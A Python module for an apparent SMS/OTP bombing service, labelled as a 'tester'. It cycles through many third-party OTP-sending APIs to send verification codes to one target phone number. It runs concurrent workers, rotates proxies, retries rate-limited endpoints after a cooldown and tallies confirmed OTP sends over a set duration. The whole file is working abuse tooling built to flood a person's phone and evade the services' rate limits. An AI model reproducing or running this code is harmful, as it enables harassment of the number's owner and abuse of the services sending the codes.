from __future__ import annotations

import asyncio
import copy
import time
import random
from typing import Dict, List, Optional
from collections import deque

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import replacePlaceholders


# ---------------------------------------------------------------------------
# OTP success detection — both 2xx AND keyword match required
# ---------------------------------------------------------------------------

OTP_KEYWORDS = [
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
    "\"result\":true", "successfully sent", "send otp",
]

def isConfirmedOtp(status: int, text: str) -> bool:
    """True only if status is 2xx AND body contains a strong OTP keyword."""
    if status not in (200, 201, 202):
        return False
    t = text.lower()
    return any(k in t for k in OTP_KEYWORDS)

def is2xx(status: int) -> bool:
    return 200 <= status < 300


# ---------------------------------------------------------------------------
# Per-API state during a test session
# ---------------------------------------------------------------------------

class ApiState:
    ACTIVE      = "active"
    RATELIMITED = "ratelimited"
    DEAD        = "dead"

    def __init__(self, name: str):
        self.name          = name
        self.status        = self.ACTIVE
        self.cooldownUntil = 0.0
        self.errorStreak   = 0
        self.requests      = 0      # total requests this session
        self.confirmed     = 0      # confirmed OTP sends
        self.responses2xx  = 0      # 2xx but not confirmed OTP
        self.rateLimits    = 0
        self.errors        = 0
        self.totalLatencyMs = 0.0
        self.latencyCount  = 0

    def isAvailable(self) -> bool:
        if self.status == self.DEAD:
            return False
        if self.status == self.RATELIMITED:
            if time.time() >= self.cooldownUntil:
                self.status = self.ACTIVE
                return True
            return False
        return True

    def recordLatency(self, latencySeconds: float) -> None:
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount   += 1

    def avgMs(self) -> int:
        if self.latencyCount == 0:
            return 0
        return int(self.totalLatencyMs / self.latencyCount)


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self, apiNames: List[str]) -> None:
        self.startTime   = time.time()
        self.totalReqs   = 0
        self.confirmed   = 0   # real confirmed OTPs
        self.responses   = 0   # 2xx responses (not all are OTPs)
        self.errors      = 0
        self.apiStates: Dict[str, ApiState] = {n: ApiState(n) for n in apiNames}
        self._lock = asyncio.Lock()

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    async def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
        async with self._lock:
            self.totalReqs += 1
            self.responses += 1
            s = self.apiStates[name]
            s.requests     += 1
            s.responses2xx += 1
            s.errorStreak   = 0
            s.recordLatency(latency)
            if confirmed:
                s.confirmed  += 1
                self.confirmed += 1

    async def recordRateLimit(self, name: str) -> None:
        async with self._lock:
            self.totalReqs += 1
            s = self.apiStates[name]
            s.requests    += 1
            s.rateLimits  += 1

    async def recordError(self, name: str) -> None:
        async with self._lock:
            self.totalReqs += 1
            self.errors    += 1
            s = self.apiStates[name]
            s.requests    += 1
            s.errors      += 1
            s.errorStreak += 1
            if s.errorStreak >= 3:
                s.status = ApiState.DEAD

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":   s.requests,
                "confirmed":  s.confirmed,
                "responses":  s.responses2xx,
                "errors":     s.errors,
                "ratelimits": s.rateLimits,
                "avgMs":      s.avgMs(),
                "status":     s.status,
            }
        return {
            "totalReqs": self.totalReqs,
            "confirmed": self.confirmed,
            "responses": self.responses,
            "errors":    self.errors,
            "elapsed":   round(self.elapsed(), 1),
            "rps":       self.rps(),
            "perApi":    perApi,
            # legacy keys for history saving
            "total":     self.totalReqs,
            "otpSent":   self.confirmed,
        }


# ---------------------------------------------------------------------------
# Round-robin API queue with smart cooldown
# ---------------------------------------------------------------------------

class ApiQueue:
    """
    Maintains a round-robin queue of available APIs.
    Rate-limited APIs get a 60s cooldown then re-enter.
    Dead APIs (3 errors in a row) are removed for the session.
    Skipped APIs (admin flagged) are never used.
    """
    RATELIMIT_COOLDOWN = 60.0

    def __init__(self, configs: List[dict], skipSet: set) -> None:
        self._all     = [c for c in configs if c["name"] not in skipSet]
        self._queue   = deque(self._all)
        self._cooling: Dict[str, float] = {}   # name -> available_at
        self._dead:    set = set()
        self._lock    = asyncio.Lock()

    async def next(self) -> Optional[dict]:
        async with self._lock:
            now     = time.time()
            checked = 0
            total   = len(self._queue)

            while checked < total:
                if not self._queue:
                    return None
                api = self._queue.popleft()
                name = api["name"]

                if name in self._dead:
                    checked += 1
                    continue

                coolUntil = self._cooling.get(name, 0)
                if coolUntil > now:
                    self._queue.append(api)  # put back at end
                    checked += 1
                    continue

                # Available — put it back at end for round-robin
                self._queue.append(api)
                return api

            return None  # all APIs cooling or dead

    async def markRateLimited(self, name: str) -> None:
        async with self._lock:
            self._cooling[name] = time.time() + self.RATELIMIT_COOLDOWN

    async def markDead(self, name: str) -> None:
        async with self._lock:
            self._dead.add(name)

    def activeCount(self) -> int:
        now  = time.time()
        dead = len(self._dead)
        cooling = sum(1 for t in self._cooling.values() if t > now)
        return max(0, len(self._all) - dead - cooling)


# ---------------------------------------------------------------------------
# Core API caller
# ---------------------------------------------------------------------------

def coerceTypes(obj: any, original: any) -> any:
    """
    After replacePlaceholders turns everything into strings,
    restore numeric types based on what the original config had.
    E.g. if original had {"phone": 919876543210} (int), keep it as int after replacement.
    """
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [coerceTypes(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try:
            return int(obj)
        except (ValueError, TypeError):
            return obj
    if isinstance(original, float) and isinstance(obj, str):
        try:
            return float(obj)
        except (ValueError, TypeError):
            return obj
    return obj


async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    apiQueue: ApiQueue,
    stopEvent: asyncio.Event,
) -> None:
    name = api["name"]
    if stopEvent.is_set():
        return

    try:
        cfg      = copy.deepcopy(api)
        headers  = replacePlaceholders(cfg.get("headers"), phone)
        params   = replacePlaceholders(cfg.get("params"), phone)
        jsonData = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data     = replacePlaceholders(cfg.get("data"), phone)
        cookies  = replacePlaceholders(cfg.get("cookies"), phone)
        url      = cfg["url"].replace("{phone}", phone)

        t0 = time.time()
        async with session.request(
            cfg["method"], url,
            headers=headers, params=params,
            json=jsonData, data=data, cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=6, connect=3),
        ) as resp:
            latency = time.time() - t0
            text    = await resp.text()

            if resp.status == 429:
                await apiQueue.markRateLimited(name)
                await stats.recordRateLimit(name)
                return

            if is2xx(resp.status):
                confirmed = isConfirmedOtp(resp.status, text)
                await stats.recordSuccess(name, latency, confirmed)
                return

            # 4xx/5xx — count as error streak
            await stats.recordError(name)
            if stats.apiStates[name].errorStreak >= 3:
                await apiQueue.markDead(name)

    except asyncio.TimeoutError:
        await stats.recordError(name)
        if stats.apiStates[name].errorStreak >= 3:
            await apiQueue.markDead(name)
    except Exception:
        await stats.recordError(name)


# ---------------------------------------------------------------------------
# Single API test (admin tester)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        cfg      = copy.deepcopy(api)
        headers  = replacePlaceholders(cfg.get("headers"), phone)
        params   = replacePlaceholders(cfg.get("params"), phone)
        jsonData = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data     = replacePlaceholders(cfg.get("data"), phone)
        cookies  = replacePlaceholders(cfg.get("cookies"), phone)
        url      = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text    = await resp.text()
                return {
                    "ok":        True,
                    "status":    resp.status,
                    "latencyMs": latency,
                    "snippet":   text[:300].strip(),
                }
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except aiohttp.ClientConnectorError as e:
        return {"ok": False, "error": f"Connection failed: {str(e)[:60]}"}
    except aiohttp.ClientSSLError as e:
        return {"ok": False, "error": f"SSL error: {str(e)[:60]}"}
    except Exception as e:
        err = str(e).strip() or type(e).__name__
        return {"ok": False, "error": err[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------

async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=5)):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
    ) -> None:
        self.phone     = phone
        self.duration  = duration
        self.workers   = workers
        self.useProxy  = useProxy
        self._proxyList = proxyList or []

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs = apiManager.getMergedConfigs()
        self._skipSet    = db.getSkippedApiNames()

        self.stats       = Stats([a["name"] for a in self._apiConfigs])
        self._stopEvent  = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running    = False
        self._endTime    = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running   = True
        self._endTime   = time.time() + self.duration
        self._stopEvent.clear()
        self.stats      = Stats([a["name"] for a in self._apiConfigs])
        self._apiQueue  = ApiQueue(self._apiConfigs, self._skipSet)

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        for i in range(self.workers):
            proxy = proxyList[i % len(proxyList)] if proxyList else None
            task  = asyncio.create_task(
                self._sender(proxy),
                name=f"sender_{i}",
            )
            self._tasks.append(task)

        # Hard timer — sets stop event at exactly endTime
        timer = asyncio.create_task(self._timer(), name="timer")
        self._tasks.append(timer)

        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.append(watchdog)

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _timer(self) -> None:
        """Sets stop event at exact end time — guaranteed accurate stop."""
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        """Marks runner as not running once all senders finish."""
        senderTasks = [t for t in self._tasks if t.get_name().startswith("sender_")]
        if senderTasks:
            await asyncio.gather(*senderTasks, return_exceptions=True)
        self._running = False

    async def _sender(self, proxy: Optional[str]) -> None:
        connector = ProxyConnector.from_url(proxy) if proxy else TCPConnector(limit=200)
        async with aiohttp.ClientSession(connector=connector) as session:
            activeTasks: set = set()

            while not self._stopEvent.is_set():
                activeTasks = {t for t in activeTasks if not t.done()}

                if len(activeTasks) >= 40:
                    await asyncio.sleep(0.05)
                    continue

                api = await self._apiQueue.next()
                if api is None:
                    await asyncio.sleep(1.0)  
                    continue

                task = asyncio.create_task(
                    callApi(session, api, self.phone, self.stats, self._apiQueue, self._stopEvent)
                )
                activeTasks.add(task)
                await asyncio.sleep(0)

            # Stop event fired — cancel everything immediately, don't wait for responses
            for t in activeTasks:
                t.cancel()
            if activeTasks:
                await asyncio.gather(*activeTasks, return_exceptions=True)
            # Close connector to abort any lingering TCP connections
            await connector.close()